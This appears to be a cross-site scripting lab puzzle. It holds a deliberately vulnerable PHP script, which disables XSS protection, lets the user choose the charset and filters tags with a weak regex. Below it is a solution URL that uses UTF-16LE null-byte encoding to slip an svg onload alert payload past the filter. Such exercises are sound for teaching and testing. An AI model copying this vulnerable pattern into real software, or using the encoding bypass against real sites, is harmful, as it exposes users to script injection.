
<?php
header('X-XSS-Protection: 0');
header('Content-Type: text/html; charset='.$_GET['charset']);
highlight_string(file_get_contents(__FILE__, true));
$x=$_GET['x'];
$x=preg_replace('/<\w+/', '', $x);
echo $x;
?>


UTF-16LE
http://192.168.100.1/xss2.php?x=%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E%00&charset=UTF-16LE
